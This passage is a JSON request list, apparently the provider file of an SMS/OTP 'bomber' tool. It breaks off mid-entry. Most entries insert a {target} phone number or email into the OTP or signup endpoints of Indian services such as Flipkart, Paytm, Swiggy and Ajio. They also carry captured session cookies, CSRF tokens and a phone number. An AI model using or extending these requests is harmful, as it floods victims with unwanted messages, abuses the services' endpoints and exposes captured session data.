    {"name": "XB_Coolwinks", "url": "https://api.coolwinks.com/api/accounts/is_already_registered/?username={target}", "method": "GET", "origin": "", "identifier": "", "extra_headers": {"Accept": "*/*", "x-user-agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36 CWUA/msite/0/", "User-Agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "Origin": "https://www.coolwinks.com", "Referer": "https://www.coolwinks.com/", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"}},
    {"name": "XB_Cansell", "url": "https://webapi.cansell.in/api/User/SignUp", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "Content-Type": "application/json;charset=UTF-8", "Origin": "https://m.cansell.in", "Referer": "https://m.cansell.in/register", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"name": "Uwusjsj", "surname": "wjeshs", "email": "hsjs@gmail.com", "phone": "{target}", "password": "eeeeee"}},
    {"name": "XB_Gaana", "url": "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"appVersion": "8.9.0", "CONTENT_TYPE": "application/json", "channel": "gaana.com", "tgid": "j9qcq0z2ur4llq2a58qqmag2", "sdkVersion": "1.0", "appVersionCode": "933", "deviceId": "j9qcq0z2ur4llq2a58qqmag2", "platform": "android", "sdkVersionCode": "1", "Content-Type": "application/json; charset=utf-8", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)", "Cookie": "bm_sz=3185FA3CAAAF8BF3058604B10A671B95~YAAQ1Y0sMTkMfql0AQAAlUo4qwliHs15jkMexu1aNjEN8flD/z5LtSgQGynujCg13M4JSO4ngtKZ0upFyNBCQ7S0uzz118OjWhFVgf58p0Nm9h2GwqTJ6JQdKEEL+X3CzGTsv1rq/VFRAda6LCAWN456iJIhY0YTqPKFsRnVsKN4e5wY0RPTA7t0jCSPuyzFIEn3; _abck=815544E3DE0B9D20C0579C4BDD367BC8~-1~YAAQ1Y0sMToMfql0AQAAlUo4qwREAoH9ULlj0dvHMO+x8J1BtAjNeouGQsG9yzY5n8wdltMClCjNw81OTfwcAV/sFBz8BKBqtNcY8NqWE9Qxpu79nALy06xH2PUU0f2QUM3U8L1KYEuHRByl+07NOj5l8/ndZlP1k06L3GCL9ndWnryiFTQhrnhan0uBbzJIcgcgOf57TqwC5RJwlJCC8j+BeZq0FG1ISubR8UJoa1n3NCYSjCvvW0UDN/haWIAxDbNclqOFxx6dIeUhFx1IbypgQGsktxMWS1WMKGThxrQRJJV2FG8hDgDOXE3LpA==~-1~-1~-1"}, "json": {"mobile": "91-91-{target}"}},
    {"name": "XB_Flipkart_1", "url": "https://1.rome.api.flipkart.com/1/action/view", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile", "Origin": "https://www.flipkart.com", "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/json", "Accept": "*/*", "Referer": "https://www.flipkart.com/login?ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&sourceContext=DEFAULT", "Accept-Language": "en-US", "Cookie": "T=BR%3Ackfcu8grn0xqvyyvwni4yxp6o.1600711394531; vh=632; vw=360; dpr=2; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18527%7CMCMID%7C76403100668224989248663375062116515669%7CMCAAMLH-1601316203%7C12%7CMCAAMB-1601316203%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1600718605s%7CNONE%7CMCAID%7CNONE; s_cc=true; S=d1t14P0w/Pz8/Pz8/P3MSPyJaPxDnS+xX3DDqgNzmvw1zqm7YyImq0FXfp+hM4pKH58SFBsLxvXQ+P8Cz8lO4CyVM5w==; SN=VI40F03BF14E7C4B628CD08259542FE831.TOKC0B6874C268A424DB5DCA004325C0C2F.1600711730.LO; gpv_pn=LOGIN_V4_MOBILE; gpv_pn_t=dynamic; s_sq=flipkart-mob-web%3D%2526pid%253DLOGIN_V4_MOBILE%2526pidt%253D1%2526oid%253Dfunctiongr%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT"}, "json": {"actionRequestContext": {"type": "LOGIN_IDENTITY_VERIFY", "loginIdPrefix": "+91", "loginId": "{target}", "clientQueryParamMap": {"ret": "/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135", "entryPage": "HOMEPAGE_HEADER_ACCOUNT"}, "loginType": "MOBILE", "verificationType": "OTP", "screenName": "LOGIN_V4_MOBILE", "sourceContext": "DEFAULT"}}},
    {"name": "XB_Flipkart_2", "url": "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png", "method": "GET", "origin": "", "identifier": "", "extra_headers": {"User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "Accept": "*/*", "Referer": "https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier={phone}&loginIdentifierPrefix=%2B91&sourceContext=default&ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&supportedAuthenticationTypes=password&churned=false", "Accept-Language": "en-US"}},
    {"name": "XB_Ullu", "url": "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={target}", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json, text/plain, */*", "origin": "https://ullu.app", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "referer": "https://ullu.app/", "accept-language": "en-US", "cookie": "_fbp=fb.1.1600715934726.1447032121; __stripe_sid=5807554c-54bc-45e8-a9c9-29ed36e779f298c41e; __stripe_mid=61958e5d-6e35-476d-8b25-35de8dc0e55bcd3559; G_ENABLED_IDPS=google; _gat_gtag_UA_126575807_1=1; _gid=GA1.2.1612551927.1600715932; _ga=GA1.2.1941258238.1600715932"}},
    {"name": "XB_Paytm", "url": "https://accounts.paytm.com/v2/api/register", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"Accept": "application/json, text/plain, */*", "Origin": "https://accounts.paytm.com", "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "Content-Type": "application/json", "Referer": "https://accounts.paytm.com/oauth2/authorize?theme=mp-html5&redirect_uri=https%3A%2F%2Fpaytm.com%2Fv1%2Fapi%2Fauthresponse&is_verification_excluded=false&client_id=paytm-web-secure&type=web_server&scope=paytm&response_type=code", "Accept-Language": "en-US", "Cookie": "bm_sz=C3DEDDABBCB6E76563706756F75C11A7~YAAQBI0sMQ9J0rF0AQAAGNwhsgl73OX8RyMOLhj4W4LXhRtHX9U2K/AmO1VYDUmLW4gKfOdtR6XWEvHUYoU5UgAAQvJTf6Sb3UmpjG/PLkwpri7ZHjCfMjgxXPOzqIRU/gLju9kAH/6dZZHPqy+tMFHhwx62ajcy3Ga1X0zO8Jjnp3Wxy2hK/7HgIEOI1CM=; bm_mi=540981F9F36D1544FEC97D099B53B53D~p9uVoaZIXMR5xK6k5lSZoJ/3FerRdOYvIPl3Hn6tTBoGwEWGZR4jeCKPVbtwXVlGmFHvYY1G6wP+yQDVir7OWEiF6RTg+3WjZ+h8KHg99TpIiJi1ELxBbguW7K0wNAjN5VCLGt1iv/pQ49j9HFjqvjKe9FHmY2NlmCFBLJSIT9el5s6QFmKkKGIT8mdtyhYqax1l6+LumeKZ3VsYeaIwv/6qYy0u9SWYHZpGh8guJDzPKM4s+dhSMTgdm3UEC4KBG51HKVHzPDlsM4fL5+e6GWyM0gkk4DqNJIcCnTwlRCU=; ak_bmsc=F8EAD94DECE07AE1EFE40A9582B5CF2D312C8D04FD5C00006DFE685F77272D3B~plcGUGZxShuIGFCeOpP68aJwg4G4r/YvFYehnveWSNhVfiGee+U1CtEXU9456Id8di6ewHICFCeUqW8BtrM3De/1nkvdeDht3qvcnG7IGkECYuMTRfK0Jhnvq+P+AVzphXerowqtTahsCY8ftXm4nUJG6n7ivFRBPNg9Xivi3rJp/aUE9fRdFtjhpDDD6201sRJnAKI7EKgBc9oTc+pW6Wfi2qW6b0tOgdDtEpGN90Ndfoll3whyTScdjCnQgeXCJC; _abck=45A4857E6B593E42F78976A08356DD9F~0~YAAQBI0sMddJ0rF0AQAA6O4hsgQPQwGVxJ7H6HN5HdNhBLY3VAskkFvejjgx6FJ/4r760cOUSDmU20pVbrc5F7utD7+WHcMoE9XXkM94FULZ64FbH4b/FJQRa7C0tMpZZvGGhhEmD7hmbpeYm/+DSi0aYcnkoD/VUQxVrPRVC9ayrUw++SusmU0pYuxAaHvlgo7+yw7cIdgebFyTTnRMDW/rNXC6FIZb5Iq7vIRIH4WAdd9C6EcL0tYmktTXaRK52+c0XfrpjtfjAfYVeq8YUWILROIOTUp3VBOYt23O5KnuFqpdjpROswkNKNCBJrLDwf/3A2dH~-1~||-1||~-1; returning_usr=1; bm_sv=DA28E6771684381F7602D33009AD7A67~cDaMe2LqH5njmD8wD8YJSs3oXzmH2Dd+n088p+XrJ5zVS+oDLveaBbMu9cIqQh31CGrdQ03246dyOUebPadurlP2lI3SMSTM7gwc/qHpzEJqxsgFYE3JmF1u8UJpEX5nAAQUtbG4gPS0nvQhx9ebVmw2Yx3+1ZIRMVJPOfAT89U="}, "json": {"email": "", "mobile": "{target}", "loginPassword": "Pura@1090", "csrfToken": "f7ea628c-91a2-5f14-82ca-6f7eee295b1d", "redirectUri": "https://paytm.com/v1/api/authresponse", "clientId": "paytm-web-secure", "scope": "paytm", "state": "", "responseType": "code", "theme": "mp-html5", "dob_agreement": true}},
    {"name": "XB_Ogonn", "url": "https://ogonn.in/otp", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json, text/javascript, */*; q=0.01", "origin": "https://ogonn.in", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://ogonn.in/login", "accept-language": "en-US", "cookie": "laravel_session=eyJpdiI6Ik9UWFwvZzlxdEozVk5ITmZGYnhQM1F3PT0iLCJ2YWx1ZSI6IituT2hPUDd0eWFhdHI2RFNjRk9GXC91Vk9DOXRaV295TzFrc041ZnAwNjNuaEJSZkxaU0JzN2FvbXNxVzA1S2trIiwibWFjIjoiMTU4YjdmYzFkMzZiNTdkMjhjZDA3MGY2YjllNTcxMzMwODU3ZjQ5ZGY2NTcyMzE5ZDhlNWFlMjNhZjc3MWYyOCJ9; XSRF-TOKEN=eyJpdiI6IkVWVEMrUW80TU1rc2U1R1pza1E2b1E9PSIsInZhbHVlIjoidWxPYUxYamtqaVh2QVFjNzlsVlZadHE2TG5VWlVPalwvN0xmTDJcLzFJSzBSaTFvSisxZmxnVmZrb20rdkQ5UkE3IiwibWFjIjoiOTZiZTA1MmM1ZTZhY2Q2NGNkYjAwOTBjZmUzMTJlNzNmNGVmMzgxYzU5ZmZhODc3ZmJkZWMwZmRjNjk4N2UxYSJ9; _fbp=fb.1.1600717201907.1836998376"}, "json": {"_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={target}"}},
    {"name": "XB_AakashDigital_1", "url": "https://digital.aakash.ac.in/mkt-signup-otp-verify", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "*/*", "origin": "https://digital.aakash.ac.in", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://digital.aakash.ac.in/online-courses?utm_source=Google_Search&utm_medium=Paid&utm_content=Online_Classes_GS&utm_campaign=Srch_Generic_GS_Exact_2020_Rxm&utm_term=online%20study%20courses&gclid=EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE", "accept-language": "en-US", "cookie": "_co_session_active=1; _gac_UA-132222061-1=1.1600720006.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE; _gid=GA1.3.1265004790.1600719997; _ga=GA1.3.1759859626.1600719997; _fbp=fb.2.1600720004859.138019050; _gat_UA-132222061-1=1; _gac_UA-132222061-1=1.1600719997.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE; _gid=GA1.4.1265004790.1600719997; _ga=GA1.4.1759859626.1600719997; AWSALB=72X09cOjNjRUWWCFBkPfC4pzIxNDaf7UOluGPLojxXMlbny21JQrAgsBxD2kPx47rLJscBQ4+YLSLds2TCR7ltut261umPg7FUh1IBCt4tCi8kjCQIzPem5vmWxd"}, "json": {"_raw": "&mobileval={target}&otp=6230"}},
    {"name": "XB_Swiggy", "url": "https://www.swiggy.com/mapi/auth/signup", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"origin": "https://www.swiggy.com", "__fetch_req__": "true", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/json", "accept": "*/*", "referer": "https://www.swiggy.com/auth/register", "accept-language": "en-US", "cookie": "_gid=GA1.2.1062400057.1600721785; _ga=GA1.2.933128931.1600721785; __cf_bm=49fd023d2de2dcc513416b86f346ef849ff78965-1600721801-1800-AffpoGFA9y2uIXnuTnsdWLAvACoa7Yoi0Atoa5go3TwGhcCaro5zMawagaz/3h6h+magOo4GhTCbVieffp6NXM0=; _device_id=becf3981-4f8f-41e0-b3dd-3188b909ae13; afUserId=e5d4b7d4-1473-4953-8dd8-7db0c6a7c614-p; __cfduid=d4953510590027eff3cccf0ec29bd40121600721785; AMP_TOKEN=%24NOT_FOUND; _gcl_au=1.1.1262278937.1600721784; _sid=p6q1ed4e-90a6-4c83-b56b-f1af071a0b17; _guest_tid=ac1bb2e7-f54c-45cb-8a69-5ebd7b6706f5; __SW=bcBBQ8mXgTrUPE0YKx8A44dDIVVH5UoB"}, "json": {"name": "dbdbdbd", "email": "tsunami@gmail.com", "password": "sndndndbdj283jsbsbs", "referral_code": "", "mobile": "{target}", "_csrf": "jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}},
    {"name": "XB_Limeroad", "url": "https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/myaccount/orders?ajax=true&mobileOnly=false&doAction=", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"origin": "https://www.limeroad.com", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "referer": "https://www.limeroad.com/feed_nup_v1?feed_kyc=true&gender=Men", "accept-language": "en-US", "cookie": "locale=hi; lrVr=v2; AWSALB=Aum/5hkqPnGDduYS/RwPuH4NMlb8KsEWzmAcaduTtaaRrPdqiZ76xnnTdzuLPupgFMK3xXY3uJH4GgYj9V5wN9MLnEwGPNy2LdlaCycYQQSBcBOfEaMI5VsVlx3/; testCookie=v2; deviceHeight=632; deviceWidth=360; gender=M; duid=e9e7b3ffb31375ea608dc18f9da4e98c; _session_id=e2b24a146c5a10f5f7abf753786a12d9; nH=1; newCssOpt=v1; _ruid=9a0ef1da-cd58-4e5e-a326-09c0e757be5a; jr_token=true%3F%3F7b529cb3-c933-43cf-9ec1-360139c2d56e%3F%3Fjoulroad%3F%3F8fe37c95-270b-4a92-81f9-2a8d684cac66%3F%3FGuest; a_n_u_a=1"}, "json": {"_raw": "utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D&user_id={target}"}},
    {"name": "XB_Cilory", "url": "https://www.cilory.com/app/w/auth/soft", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json", "origin": "https://www.cilory.com", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/json;charset=UTF-8", "referer": "https://www.cilory.com/authentication?back=%2Fmy-account", "accept-language": "en-US", "cookie": "2ceb3d353e9c50fe7a9dad32e9e13b2a=IlS0K5pquXDrkAGJ4KMhpPkViw5v6JpcBK%2Fo0kMH8Ac3xz8xhstQoj6kxqf98nqjdK6C3J1P%2FvinTLjgm6uYZUF1S0sA8eCOQ%2F4zan%2BdtjQ%3D123456; _fbp=fb.1.1600749694805.191445483; _gcl_aw=GCL.1600749692.EAIaIQobChMIkorHyvj76wIVVqWWCh1XDQ-UEAQYCSABEgJce_D_BwE; _gat_gtag_UA_18030761_1=1; _gac_UA-18030761-1=1.1600749692.EAIaIQobChMIkorHyvj76wIVVqWWCh1XDQ-UEAQYCSABEgJce_D_BwE; _gid=GA1.2.468416282.1600749692; _ga=GA1.2.2135791951.1600749692"}, "json": {"mobile": "{target}"}},
    {"name": "XB_Ajio_1", "url": "https://login.web.ajio.com/api/auth/accountCheck", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json", "Origin": "https://www.ajio.com", "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/json", "Referer": "https://www.ajio.com/signup?referrer=/my-account/", "Accept-Language": "en-US", "Cookie": "FirstPage=Tue Sep 22 2020 10:56:22 GMT+0530 (IST); cdigiMrkt=utm_source%3A%7Cutm_medium%3A%7Cdevice%3Amobile%7Cexpires%3AThu%2C%2022%20Oct%202020%2005%3A26%3A29%20GMT%7C; _fp=3bb177293be711354c411930e1c5a87b; _ga=GA1.2.741522456.1600752380; _gid=GA1.2.1110829528.1600752380; _gac_UA-68002030-1=1.1600752389.EAIaIQobChMI6MWt_YL86wIVQZ_CCh13KwoHEAQYDiABEgI94vD_BwE; V=201; TS01fe4249=01ef61aed0002976a57b4d1bb8abc432bc6065f29099a472ea7f37800ed6f0344eaca4aeb95e747321704d1b608a74c8f71e11dd2f0a7ed84c45017f54a62bb31323cfbeb7; uI=9519874704; TS017df282=01ef61aed045c87a16cd6397e020723e2c6b61f0afebf7d3ac273bcf3b708d4fd2ce15171afb2a7cac64409db30eb76abe89effe8a046fd375ed2169ab7af96233a02f1c21; WZRK_G=ab70e1057e5e479ba540650bf8aa228a; WZRK_S_48K-4R4-K84Z=%7B%22p%22%3A6%2C%22s%22%3A1600752384%2C%22t%22%3A1600752586%7D; sessionStatus=true|undefined; cto_bundle=m71QbF9GWENqWWJaJTJCVWtlNUFVNzAydUNTYnk4VXkzYm9NdzdkbTJQeUEzWWlzQUxtMiUyQnVYWjVWaFlXT2g1bDVlNXNhdUVROTdBR2ZNb2JwJTJCZHhZRUs4SEolMkZRQVVMemtkdWo2QzNyV09wVVFrVDZsYU1DYTAyMk1pdlhLeWM0T3hWQmdrcjNaNjNqcUFTdGhwZ1Z6cWZwQVQyUSUzRCUzRA; _fbp=fb.1.1600752385516.1674349488"}, "json": {"emailId": "tsunami@gmail.com"}},
    {"name": "XB_Ajio_2", "url": "https://login.web.ajio.com/api/auth/signupSendOTP", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json", "Origin": "https://www.ajio.com", "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/json", "Referer": "https://www.ajio.com/signup?referrer=/my-account/", "Accept-Language": "en-US"}, "json": {"firstName": "Tsunami Bomber", "login": "tsunami@gmail.com", "password": "kd34646@3131nxnxn", "genderType": "", "mobileNumber": "{target}", "requestType": "SENDOTP"}},
    {"name": "XB_AakashDigital_2", "url": "https://digital.aakash.ac.in/signup-otp-verify", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "*/*", "origin": "https://digital.aakash.ac.in", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://digital.aakash.ac.in/user/register", "accept-language": "en-US", "cookie": "__zlcmid=10IjS9ldmuaIwof; _co_session_active=1; _gac_UA-132222061-1=1.1600720006.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE; _gid=GA1.3.1265004790.1600719997; _ga=GA1.3.1759859626.1600719997; _fbp=fb.2.1600720004859.138019050; _hjIncludedInSessionSample=1; _gac_UA-132222061-1=1.1600720006.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE; _gid=GA1.4.1265004790.1600719997; _ga=GA1.4.1759859626.1600719997; AWSALB=dc39iVQJB7z5bxbK+8AZ/kOwW29goA5mAejiW5ecDoRFe5kGjNfw2I7KdE72gvy0JdR+T98HU7sz/9SX2sS7zbjR5mfmkhdngzxHGshtH9XM94QFW5L0uL+aIzpf; cto_bundle=wRx-il9KZ1ZVUFBBUEdtaDhUbExxZnBYcTJTOXZXd050Z0E3TnElMkZqNyUyRlZ3VGRZcGNuZjJJUDZ4MFlyZk9waTdsQjJLMUFtWDlpdG1XWG5iT1hZSU9VeGslMkJRQ21uJTJCaWplbW94cEZaaDZpZ3FMMnBKUmV3OFN4d1h6SVo3clQ1VjFQOEtQS2RLV2U0ajBPMnc1NnJyMUwlMkYxSkVnJTNEJTNE; _uetvid=d753b1ed7dd67a59bebc401d8ab4515b; _uetsid=946c3602e20e8980818f215fc8fac48f; _gcl_au=1.1.2026770221.1600758975; wh-widget-cookie=1; _hjid=30609baa-1084-4a2e-998c-54e41f4084fd; _hjTLDTest=1"}, "json": {"_raw": "&mobileval={target}"}},
    {"name": "XB_BookMyShow_1", "url": "https://in.bookmyshow.com/pwa/api/uapi/otp/send", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json", "origin": "https://in.bookmyshow.com", "referer": "https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber=9519874704&email=&source=web", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "G_ENABLED_IDPS=google; __gads=ID=d26aff9d3d5b5940:T=1600760478:S=ALNI_MYNMzi7KJxqglyRDRdb3Nr2POPTCQ; WZRK_S_RK4-47R-98KZ=%7B%22p%22%3A2%2C%22s%22%3A1600760468%2C%22t%22%3A1600760475%7D; __cfruid=8e5d4c1f350ee79cb716173f1ffdbf6d93c83193-1600760464; WZRK_G=0cf00ce388574ff6ba9d04426bc06a73; _fbp=fb.1.1600760469186.748107165; _gat_UA-27207583-8=1; tvc_bmscookie_gid=GA1.2.385961487.1600760469; tvc_bmscookie=GA1.2.791995216.1600760469; AMP_TOKEN=%24NOT_FOUND; rgn=%7B%22regionCode%22%3A%22FAZA%22%2C%22regionName%22%3A%22Faizabad%22%2C%22subCode%22%3A%22%22%2C%22subName%22%3A%22%22%2C%22regionNameSlug%22%3A%22faizabad%22%2C%22regionCodeSlug%22%3A%22faza%22%2C%22Lat%22%3A%2226.7732%22%2C%22Long%22%3A%2282.1442%22%7D; overrideArea=%22true%22; userNotified=false; sessionId=1600760454038; _gcl_au=1.1.1886680337.1600760453; preferences=%7B%22ticketType%22%3A%22M-TICKET%22%7D; bmsId=1.970754064.1600760445681; __cfduid=d81aa31782d9363b10830a4a64d9b9ad71600760445"}, "json": {"channel": "phone", "subChannel": "sms", "details": {"phone": "{target}", "origin": "https://in.bookmyshow.com"}}},
    {"name": "XB_BigBasket", "url": "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json", "x-csrftoken": "gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "x-channel": "BB-PWA", "content-type": "application/json", "origin": "https://www.bigbasket.com", "referer": "https://www.bigbasket.com/auth/login/", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "adb=0; G_ENABLED_IDPS=google; bigbasket.com=9431754c-9582-4b9f-b24b-532a320f74f7; ts=\"2020-09-22 13:20:05.803\"; _fbp=fb.1.1600761006368.1940593604; _gcl_au=1.1.1149181141.1600761003; bb_home_cache=a85e99f3.431.visitor; _bb_rd=1; _bb_rdt=\"MzEzOTUwNDU2Ng==.1\"; _bb_aid=\"MzE5NTMyMDU0Nw==\"; _bb_tc=1; sessionid=bjd52bw7pig7mpw92e621b4nmbjllpdg; _bb_hid=454; _client_version=2321; data=%7B%22referrerInPageContext%22%3A%22backbtn%22%7D; _gat_gtag_UA_27455376_1=1; _gid=GA1.2.467547806.1600760997; _ga=GA1.2.1059142911.1600760997; bb_home_cache=a85e99f3.431.visitor; csrftoken=gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED; _bb_cid=27; _bb_dsid=; _bb_vid=MzgxMTEyNTc0OA==; _bb_nhid=454; _bb_loid=j:null; PWA=1; _bb_locSrc=akamai"}, "json": {"identifier": "{target}"}},
    {"name": "XB_FloMattress", "url": "https://cod.flomattress.com/api/otp", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"Accept": "application/json, text/javascript, */*; q=0.01", "Save-Data": "on", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.flomattress.com", "Referer": "https://www.flomattress.com/account/register", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"_raw": "number={target}&store=hushbedding.myshopify.com"}},
    {"name": "XB_Banggood", "url": "https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json", "x-requested-with": "XMLHttpRequest", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded", "origin": "https://m.banggood.in", "referer": "https://m.banggood.in/login.html", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "akaas_WWW1ABTestS=1600784215~rv=86~id=142dea7c39dcdf1aa52b02a9edb65857; _sctr=1|1600713000000; 